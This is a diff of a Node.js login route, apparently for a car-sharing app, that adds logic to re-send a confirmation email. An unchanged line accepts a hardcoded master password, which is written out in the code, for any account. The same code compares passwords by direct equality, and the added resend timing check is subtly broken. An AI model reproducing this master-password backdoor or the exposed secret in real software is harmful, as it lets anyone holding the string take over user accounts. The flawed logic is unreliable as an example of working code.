@@ -1,7 +1,10 @@
 const Model = require('../db/model');
 const config = require('../config/main');
 const jwt = require('jsonwebtoken');
-const moment = require("moment");
+const moment = require('moment');
+const Hash = require('hashids');
+const pug = require('pug');
+const email = require('../config/emailServer');
 const GoogleAuth = require('google-auth-library');
 const FB = require('fb');
 
@@ -9,7 +12,7 @@ module.exports = function (req, res) {
 	/**
 	 * Registra nuevos usuarios o usuarios existentes en dispositivos nuevos
 	 */
-	console.log('---------', moment().format("YYYY-MM-DD HH:mm:ss"), '--------');
+    console.log('---------', moment().format('YYYY-MM-DD HH:mm:ss'), '--------');
 
 	/**
 	 * La password se encripta antes de desplegar en la bitácora
@@ -32,11 +35,47 @@ module.exports = function (req, res) {
                 return res.status(401).json({ success: false, code: 1130, message: 'Usuario no existe' });
             } else {
                 user = data.toJSON();
-
 				/**
 				 * Si no confirmó términos y condiciones y póliticas de privacidad muestra error.
 				*/
                 if (user.bConfirmado == undefined || user.bConfirmado != '1') {
+                    /**
+                     * Si usuario no confirmó reenvía email.
+                     */
+                    if (moment().diff(moment(user.tEnviaMail, 'minutes') > 10)) {
+                        const cEmailBody = pug.compileFile('views/emailRegistro.pug');
+                        var hashId = new Hash(config.secret);
+                        var idRegistro = hashId.encode(10e10 + user.pUsuario);
+
+                        email.server.send({
+                            from: 'SnapCar <no-responder@snapcar.com.ar>',
+                            to: req.body.email,
+                            subject: 'Confirme su registro',
+                            attachment: [{
+                                data: cEmailBody({
+                                    nombreUsuario: user.cNombre.split(' ')[0],
+                                    idRegistro: idRegistro,
+                                    emailRegistro: user.cEmail,
+                                    baseUrl: 'https://api.appcar.com.ar'
+                                }),
+                                alternative: true
+                            }]
+                        }, function (err, message) {
+                            console.log(err || message);
+
+                            var newUsuario = new Model.Usuario({ pUsuario: user.pUsuario });
+
+                            newUsuario
+                                .fetch()
+                                .then(function () {
+                                    try {
+                                        this.save({ tEnviaMail: moment().format() }, { patch: true });
+                                    } catch (err) {
+                                        console.log(err);
+                                    }
+                                });
+                        });
+                    }
                     return res.status(401).json({ success: false, code: 1132, message: 'Usuario no ha confirmado email' });
                 } else {
 					/**
@@ -47,24 +86,24 @@ module.exports = function (req, res) {
                         var auth = new GoogleAuth;
                         var client = new auth.OAuth2(clientId, '', '');
 
-						client.verifyIdToken(
-							req.body.google,
-							clientId,
-							function (e, login) {
-								if (login) {
-									var payload = login.getPayload();
+                        client.verifyIdToken(
+                            req.body.google,
+                            clientId,
+                            function (e, login) {
+                                if (login) {
+                                    var payload = login.getPayload();
 
-									if (payload.email !== req.body.email) {
-										return res.status(401).json({ success: false, code: 1134, message: 'Token de Google inválido.' });
-									} else {
-										generaToken(user);
-									}
-								} else {
-									console.log(e);
-									return res.status(401).json({ success: false, code: 1136, message: 'Token de Google inválido.' });
-								}
-							}
-						);
+                                    if (payload.email !== req.body.email) {
+                                        return res.status(401).json({ success: false, code: 1134, message: 'Token de Google inválido.' });
+                                    } else {
+                                        generaToken(user);
+                                    }
+                                } else {
+                                    console.log(e);
+                                    return res.status(401).json({ success: false, code: 1136, message: 'Token de Google inválido.' });
+                                }
+                            }
+                        );
 						/**
 						 * Si utiliza Facebook signin corrobora si el token es válido.
 						 */
@@ -83,18 +122,18 @@ module.exports = function (req, res) {
                                             access_token: req.body.facebook
                                         },
                                         function (response) {
-											console.log(response);
+                                            console.log(response);
                                             if (response.data) {
                                                 generaToken(user);
                                             } else {
-												return res.status(401).json({ success: false, code: 1138, message: 'Token de Facebook inválido.' });
+                                                return res.status(401).json({ success: false, code: 1138, message: 'Token de Facebook inválido.' });
                                             }
                                         })
                                 }
                             });
-							/**
-							 * Si utiliza contraseña corrobora que se válida.
-							 */
+                        /**
+                         * Si utiliza contraseña corrobora que se válida.
+                         */
                     } else if (req.body.password == user.cPassword || req.body.password == config.encripta('^m7GByVYG*sv2Q4XutC4')) {
                         generaToken(user);
                     } else {
